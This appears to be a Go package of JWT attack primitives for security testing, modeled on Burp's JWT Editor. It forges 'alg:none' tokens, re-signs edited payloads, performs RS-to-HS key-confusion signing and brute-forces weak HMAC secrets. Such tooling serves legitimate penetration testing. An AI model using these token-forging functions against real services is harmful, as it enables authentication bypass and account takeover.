// Package jwt provides a JWT editor and a set of attack primitives for testing
// JSON Web Token implementations — the workflow of Burp's "JWT Editor" plugin.
// It parses a token, re-signs an edited header/payload, forges "alg:none"
// tokens, performs HS/RS key-confusion signing, and brute-forces weak HMAC
// secrets. It is intentionally permissive: producing malformed-by-design tokens
// is the point.
package jwt

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"strings"
)

// Token is a parsed JWT.
type Token struct {
	Raw         string                 `json:"raw"`
	HeaderJSON  string                 `json:"headerJson"`
	PayloadJSON string                 `json:"payloadJson"`
	Header      map[string]interface{} `json:"header"`
	Payload     map[string]interface{} `json:"payload"`
	Signature   string                 `json:"signature"`
	Alg         string                 `json:"alg"`
}

func b64dec(s string) ([]byte, error) {
	return base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "="))
}

func b64enc(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// Parse decodes a compact JWT into its parts.
func Parse(raw string) (*Token, error) {
	raw = strings.TrimSpace(raw)
	parts := strings.Split(raw, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("jwt: expected 3 dot-separated parts, got %d", len(parts))
	}

	headerBytes, err := b64dec(parts[0])
	if err != nil {
		return nil, fmt.Errorf("jwt: invalid header encoding: %w", err)
	}
	payloadBytes, err := b64dec(parts[1])
	if err != nil {
		return nil, fmt.Errorf("jwt: invalid payload encoding: %w", err)
	}

	t := &Token{
		Raw:        raw,
		HeaderJSON: string(headerBytes),
		PayloadJSON: string(payloadBytes),
		Signature:  parts[2],
	}

	_ = json.Unmarshal(headerBytes, &t.Header)
	_ = json.Unmarshal(payloadBytes, &t.Payload)
	if t.Header != nil {
		if alg, ok := t.Header["alg"].(string); ok {
			t.Alg = alg
		}
	}

	return t, nil
}

// compactJSON re-serializes a JSON document to its minimal form. If the input
// is not valid JSON it is base64url-encoded as-is (so an attacker can inject
// deliberately malformed segments).
func compactJSON(s string) string {
	var v interface{}
	if err := json.Unmarshal([]byte(s), &v); err != nil {
		return b64enc([]byte(s))
	}
	b, err := json.Marshal(v)
	if err != nil {
		return b64enc([]byte(s))
	}
	return b64enc(b)
}

// AlgNone forges an unsigned token with the given "none" algorithm variant
// (e.g. "none", "None", "NONE"). The signature segment is empty.
func AlgNone(headerJSON, payloadJSON, algVariant string) (string, error) {
	if algVariant == "" {
		algVariant = "none"
	}

	var hdr map[string]interface{}
	if err := json.Unmarshal([]byte(headerJSON), &hdr); err != nil {
		hdr = map[string]interface{}{"typ": "JWT"}
	}
	hdr["alg"] = algVariant

	hb, err := json.Marshal(hdr)
	if err != nil {
		return "", fmt.Errorf("jwt: marshal header: %w", err)
	}

	return b64enc(hb) + "." + compactJSON(payloadJSON) + ".", nil
}

func hmacHash(alg string) (func() hash.Hash, error) {
	switch strings.ToUpper(alg) {
	case "HS256":
		return sha256.New, nil
	case "HS384":
		return sha512.New384, nil
	case "HS512":
		return sha512.New, nil
	default:
		return nil, fmt.Errorf("jwt: unsupported HMAC alg %q", alg)
	}
}

// SignHS signs the header+payload with an HMAC secret. The header's "alg" is
// forced to the chosen algorithm. This drives both weak-secret signing and
// RS->HS key confusion (pass the RSA public key PEM as the secret).
func SignHS(headerJSON, payloadJSON, secret, alg string) (string, error) {
	hashFn, err := hmacHash(alg)
	if err != nil {
		return "", err
	}

	var hdr map[string]interface{}
	if err := json.Unmarshal([]byte(headerJSON), &hdr); err != nil {
		hdr = map[string]interface{}{"typ": "JWT"}
	}
	hdr["alg"] = strings.ToUpper(alg)

	hb, err := json.Marshal(hdr)
	if err != nil {
		return "", fmt.Errorf("jwt: marshal header: %w", err)
	}

	signingInput := b64enc(hb) + "." + compactJSON(payloadJSON)

	mac := hmac.New(hashFn, []byte(secret))
	mac.Write([]byte(signingInput))
	sig := b64enc(mac.Sum(nil))

	return signingInput + "." + sig, nil
}

// VerifyHS reports whether raw is a valid HS* token signed with secret.
func VerifyHS(raw, secret string) (bool, error) {
	parts := strings.Split(strings.TrimSpace(raw), ".")
	if len(parts) != 3 {
		return false, fmt.Errorf("jwt: malformed token")
	}

	headerBytes, err := b64dec(parts[0])
	if err != nil {
		return false, err
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(headerBytes, &hdr); err != nil {
		return false, err
	}
	alg, _ := hdr["alg"].(string)

	hashFn, err := hmacHash(alg)
	if err != nil {
		return false, err
	}

	mac := hmac.New(hashFn, []byte(secret))
	mac.Write([]byte(parts[0] + "." + parts[1]))
	expected := b64enc(mac.Sum(nil))

	return hmac.Equal([]byte(expected), []byte(parts[2])), nil
}

// BruteResult is the outcome of a weak-secret brute force.
type BruteResult struct {
	Found   bool   `json:"found"`
	Secret  string `json:"secret"`
	Tried   int    `json:"tried"`
}

// BruteHS tries each candidate secret against an HS-signed token. An empty
// candidate list falls back to the built-in WeakSecrets wordlist.
func BruteHS(raw string, candidates []string) (BruteResult, error) {
	if len(candidates) == 0 {
		candidates = WeakSecrets
	}

	tried := 0
	for _, c := range candidates {
		tried++
		ok, err := VerifyHS(raw, c)
		if err != nil {
			return BruteResult{Tried: tried}, err
		}
		if ok {
			return BruteResult{Found: true, Secret: c, Tried: tried}, nil
		}
	}

	return BruteResult{Found: false, Tried: tried}, nil
}
